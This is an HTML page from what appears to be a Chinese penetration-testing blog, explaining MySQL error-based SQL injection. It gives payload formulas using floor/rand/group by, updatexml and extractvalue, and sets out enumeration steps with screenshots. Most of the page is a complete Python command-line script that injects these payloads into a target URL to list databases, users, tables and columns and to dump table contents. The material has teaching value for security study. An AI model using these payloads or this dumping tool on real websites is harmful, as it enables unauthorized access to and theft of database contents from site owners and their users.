<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content=""/>
  <meta name="author" content="Reber"/>
  
    
      <title>SQL 注入之报错型注入(MySQL) | Reber&#39;s Blog</title>
    
  
  <link rel="stylesheet" href="/css/reset.css"/>
  <link rel="stylesheet" href="/css/font.css"/>
  <link rel="stylesheet" href="/css/smigle.css"/>
  
    <link rel="stylesheet" href="/css/monokai-sublime.min.css"/>
  
    <link rel="stylesheet" href="/css/style.css"/>
  
  
    <script src="/js/jquery-3.6.0.min.js"/></script>
  
    <script src="/js/highlight.min.js"/></script>
  
    <script src="/js/style.js"/></script>
  
  <link rel="icon" type="image/img" sizes="16x16" href="/img/logo.png">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
</head>

  <body>
    <header>
  <div id="brand">
    <a class="icon-link" href="https://wyb0.com/">
      <img
        class="icon"
        src="/img/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://wyb0.com/"><h1>Reber&#39;s Blog</h1></a>
      <h3>只会一点点编程、只会一点点渗透</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/posts/"><b>Posts</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/friends/"><b>Friends</b></a>
      
    
  </nav>
  <hr />
</header>

    <div id="content">
      
  <main>
    <article>
      <h1>SQL 注入之报错型注入(MySQL)</h1>
      
<div class="post-meta">
    <time>2016-06-22</time>
    
    [<a href="/categories/Pentest">Pentest</a>](<a href="/tags/SQL%E6%B3%A8%E5%85%A5">SQL注入</a>)
</div>

      <div>

<h3 id="0x00-前提">0x00 前提</h3>

<pre><code>一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用，
它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解
</code></pre>

<h3 id="0x01-利用方式">0x01 利用方式</h3>

<p>报错注入只要套用公式即可，如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):</p>

<p>?id=2&rsquo; and (select 1 from <f>(select <u>count(*),<b>concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x</b></u> from information_schema.tables group by x )a</f>
)--+</p>

<p>?id=2&rsquo; and updatexml(1,concat(0x7e,(<f>SELECT @@version</f>),0x7e),1)--+</p>

<p>?id=1&rsquo; and extractvalue(1, concat(0x7e, (<f>select @@version</f>),0x7e))--+</p>

<p>第一个公式具体原理可以参考：<a href="/posts/2016/mysql-injection-error-based-theory-count-rand-groupby?_blank">MySQL报错注入原理分析(count()、rand()、group by)</a></p>

<h3 id="0x02-公式解析">0x02 公式解析</h3>

<pre><code>floor()是取整数
rand()在0和1之间产生一个随机数
rand(0)*2将取0到2的随机数
floor(rand()*2)有两条记录就会报错
floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的
count(*)是用来统计结果的，相当于刷新一次结果
group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1
group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次
</code></pre>

<h3 id="0x03-注入步骤">0x03 注入步骤</h3>

<ol>
<li><p>猜测闭合字符
<img src="/img/post/sqli5_get_closed_character.png" alt="得到闭合字符" />
<img src="/img/post/sqli5_check_closed_character.png" alt="确认闭合字符" /></p></li>

<li><p>猜测列数
<img src="/img/post/sqli5_order_by.png" alt="得到列数" /></p></li>

<li><p>尝试得到显示位
<img src="/img/post/sqli5_get_display_point.png" alt="尝试得到显示位" /></p></li>

<li><p>报错得到数据库个数
<img src="/img/post/sqli5_get_db_num.png" alt="报错得到数据库个数" /></p></li>

<li><p>报错得到数据库名
<img src="/img/post/sqli5_get_db_name.png" alt="报错得到数据库名" /></p></li>

<li><p>报错得到表名
<img src="/img/post/sqli5_get_table_num.png" alt="报错得到表的个数" />
<img src="/img/post/sqli5_get_table_name.png" alt="报错得到表名" /></p></li>

<li><p>报错得到列名
<img src="/img/post/sqli5_get_column_num.png" alt="报错得到列的个数" />
<img src="/img/post/sqli5_get_column_name1.png" alt="报错得到列名1" />
<img src="/img/post/sqli5_get_column_name2.png" alt="报错得到列名2" /></p></li>

<li><p>得到列值
<img src="/img/post/sqli5_get_column_value_num.png" alt="报错得到数据条数" />
<img src="/img/post/sqli5_get_column_value.png" alt="报错得到列的值" /></p></li>
</ol>

<h3 id="0x04-附上利用代码">0x04 附上利用代码</h3>

<pre><code class="language-python">#!/usr/bin/env python
# -*- coding: utf-8 -*-  

import re
import urllib
import urllib2
import binascii
from pyfiglet import figlet_format
from optparse import OptionParser


# --dbs url
def getAllDatabases(url):
    # print url
    payload = &quot;' and(select 1 from(select+count(*),concat((select (select (select+concat(0x7e7e3a7e7e, count(distinct table_schema),0x7e7e3a7e7e) from information_schema.tables)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot;
    payload = &quot;/**/&quot;.join(payload.split())
    dbs_num_url = url + payload
    # print dbs_num_url
    response = urllib2.urlopen(dbs_num_url)
    html = response.read()
    # print html
    # ~~:~~5~~:~~
    dbs_num = int(re.search(r'~~:~~(\d*?)~~:~~', html).group(1))
    print &quot;database num: %d&quot; % dbs_num
    print &quot;database name: &quot;
    for index in xrange(0,dbs_num):
        payload = &quot;' and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e7e3a7e7e, table_schema, 0x7e7e3a7e7e) from information_schema.tables limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % index
        payload = &quot;/**/&quot;.join(payload.split())
        db_name_url = url + payload
        response = urllib2.urlopen(db_name_url)
        html = response.read()
        db_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
        print &quot;\t%s&quot; % db_name

def getCurrentDb(url):
    # print &quot;CurrentDb is: aaaa&quot;
    # print url

    current_db_name_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/database()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot;
    response = urllib2.urlopen(current_db_name_url)
    html = response.read()
    current_db_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
    print &quot;Current database is: %s&quot; % current_db_name

def getCurrentUser(url):
    db_name_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(select/**/concat(0x7e7e3a7e7e,/**/(select/**/user()),/**/0x7e7e3a7e7e)))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot;
    response = urllib2.urlopen(db_name_url)
    html = response.read()
    user_name = re.search(r'~~:~~(.*?)~~:~~', html).group(1)
    print &quot;Current user is: %s&quot; % user_name

# --tables -D database url
def getAllTablesByDb(url,db_name):
    # print db_name
    # print url
    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
    # print db_name_hex
    tables_num_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/count(table_name),/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=%s))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot; % db_name_hex
    response = urllib2.urlopen(tables_num_url)
    html = response.read()
    # print html
    tables_num = int(re.search(r'~~:~~(\d*?)~~:~~', html).group(1))
    # print tables_num
    print &quot;%s has %d table&quot; % (db_name, tables_num)
    print &quot;table name: &quot;
    for index in xrange(0,tables_num):
        tables_name_url = url + &quot;'+and(select/**/1/**/from(select/**/count(*),concat((select/**/(select/**/(/**/select/**/concat(0x7e7e3a7e7e,/**/table_name,/**/0x7e7e3a7e7e)/**/from/**/information_schema.tables/**/where/**/table_schema=%s/**/limit/**/%d,1))/**/from/**/information_schema.tables/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)--+&quot; % (db_name_hex, index)
        response = urllib2.urlopen(tables_name_url)
        html = response.read()
        # print html
        table_name = re.search(r'~~:~~(.*?)~~:~~',html).group(1)
        print &quot;\t%s&quot; % table_name

def getAllColumnsByTable(url,table_name,db_name):
    db_name_hex = &quot;0x&quot; + binascii.b2a_hex(db_name)
    table_name_hex = &quot;0x&quot; + binascii.b2a_hex(table_name)
    payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(column_name),0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (table_name_hex,db_name_hex)
    # print payload
    payload = &quot;/**/&quot;.join(payload.split())
    column_num_url = url + payload
    response = urllib2.urlopen(column_num_url)
    html = response.read()
    column_num = int(re.search(r'~~:~~(\d*?)~~:~~',html).group(1))
    # print column_num
    print &quot;Table %s of the %s has %d columns&quot; % (table_name,db_name,column_num)
    print &quot;Table %s contains the column name:&quot; % table_name
    for index in xrange(0,column_num):
        payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,column_name,0x7e7e3a7e7e) from information_schema.columns where table_name=%s and table_schema=%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (table_name_hex,db_name_hex,index)
        payload = &quot;/**/&quot;.join(payload.split())
        # print payload
        column_value_url = url + payload
        response = urllib2.urlopen(column_value_url)
        html = response.read()
        # print html
        column_name = re.search(r'~~:~~(.*?)~~:~~',html).group(1)
        print &quot;\t%s&quot; % column_name


def getAllcontent(url,column_name,table_name,db_name):
    # print url
    # print column_name
    # print table_name
    # print db_name
    column_name = column_name.split(',')
    num_column = len(column_name) #想得到的字段的个数
    # print column_name
    # print num_column

    payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(0x7e7e3a7e7e,count(*),0x7e7e3a7e7e) from %s.%s)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (db_name,table_name)
    # print payload
    payload = &quot;/**/&quot;.join(payload.split())
    column_value_url = url + payload
    response = urllib2.urlopen(column_value_url)
    html = response.read()
    # print html
    column_value_num = int(re.search(r'~~:~~(\d*?)~~:~~',html).group(1))
    print &quot;Table %s has %d columns&quot; % (table_name,column_value_num)
    print &quot;Table %s column values:&quot; % table_name

    title = &quot;\t&quot;
    str_value = &quot;0x7e7e3a7e7e,&quot;
    for x in xrange(0,num_column):
        title += &quot;%-15s&quot; % column_name[x]
        str_value += &quot;%s,0x20,&quot; % column_name[x]
    str_value = &quot;,&quot;.join(str_value.split(',')[0:-2]) +&quot;,0x7e7e3a7e7e&quot;
    # print str_value
    
    print title
    for index in xrange(0,column_value_num):
        payload = &quot;'+and(select 1 from(select count(*),concat((select (select ( select concat(%s) from %s.%s limit %d,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)--+&quot; % (str_value,db_name,table_name,index)
        # print payload
        payload = &quot;/**/&quot;.join(payload.split())
        value_url = url + payload
        response = urllib2.urlopen(value_url)
        html = response.read()
        # print html
        value = re.search(r'~~:~~(.*?)~~:~~',html).group(1).split()
        # print value
        stri = &quot;\t&quot;
        # print len(value)
        if len(value)==0:
            print &quot;&quot;
        else:
            for x in xrange(0,num_column):
                stri += &quot;%-15s&quot; % value[x]
            print stri

def main():
    print figlet_format(&quot;sqli-error&quot;)
    parser = OptionParser()
    parser.add_option(&quot;-u&quot;,&quot;--URL&quot;,action=&quot;store&quot;,
              type=&quot;string&quot;,dest=&quot;url&quot;,
              help=&quot;get url&quot;)
    parser.add_option(&quot;-D&quot;,&quot;--DB&quot;,action=&quot;store&quot;,
              type=&quot;string&quot;,dest=&quot;db_name&quot;,
              help=&quot;get database name&quot;)
    parser.add_option(&quot;-T&quot;,&quot;--TBL&quot;,action=&quot;store&quot;,
              type=&quot;string&quot;,dest=&quot;table_name&quot;,
              help=&quot;get table name&quot;)
    parser.add_option(&quot;-C&quot;,&quot;--COL&quot;,action=&quot;store&quot;,
              type=&quot;string&quot;,dest=&quot;column_name&quot;,
              help=&quot;get column name&quot;)

    parser.add_option(&quot;--dbs&quot;,action=&quot;store_true&quot;,
              dest=&quot;dbs&quot;,help=&quot;get all database name&quot;)
    parser.add_option(&quot;--current-db&quot;,action=&quot;store_true&quot;,
              dest=&quot;current_db&quot;,help=&quot;get current database name&quot;)
    parser.add_option(&quot;--current-user&quot;,action=&quot;store_true&quot;,
              dest=&quot;current_user&quot;,help=&quot;get current user name&quot;)
    parser.add_option(&quot;--tables&quot;,action=&quot;store_true&quot;,
              dest=&quot;tables&quot;,help=&quot;get tables from databases&quot;)
    parser.add_option(&quot;--columns&quot;,action=&quot;store_true&quot;,
              dest=&quot;columns&quot;,help=&quot;get columns from tables&quot;)
    parser.add_option(&quot;--dump&quot;,action=&quot;store_true&quot;,
              dest=&quot;dump&quot;,help=&quot;get value&quot;)
    (options,args) = parser.parse_args()


    if options == None or options.url == None:
        parser.print_help()
    elif options.dump and options.column_name and options.table_name and options.db_name:
        getAllcontent(options.url,options.column_name,options.table_name,options.db_name)
    elif options.table_name and options.db_name:
        getAllColumnsByTable(options.url,options.table_name,options.db_name)
    elif options.db_name:
        getAllTablesByDb(options.url,options.db_name)    
    elif options.dbs:
        getAllDatabases(options.url)
    elif options.current_db:
        getCurrentDb(options.url)
    elif options.current_user:
        getCurrentUser(options.url)
    elif options.url:
        print &quot;you input: sqli-error.py -u www.xxx.com/?id=xx&quot;


if __name__ == '__main__':
    main()
</code></pre>
</div>
    </article>
  </main>

    </div>
    <footer>
  <hr />
  
    <p id="social">
      Find me around the web:
      
        
        <a href="https://github.com/reber0?_blank">GitHub</a>
      
         • 
        <a href="https://weibo.com/u/5819760166?_blank">Weibo</a>
      
    </p>
  
  <p class="copyright">
    Copyright © 2015-2022
    <a href="https://wyb0.com/"><strong>Reber</strong></a>.

    Built with
    <a href="http://www.gohugo.io/">Hugo</a>,
    based on the theme
    <a href="https://gitlab.com/ian-s-mcb/smigle-hugo-theme">smigle</a>.
  </p>
</footer>

  </body>
</html>
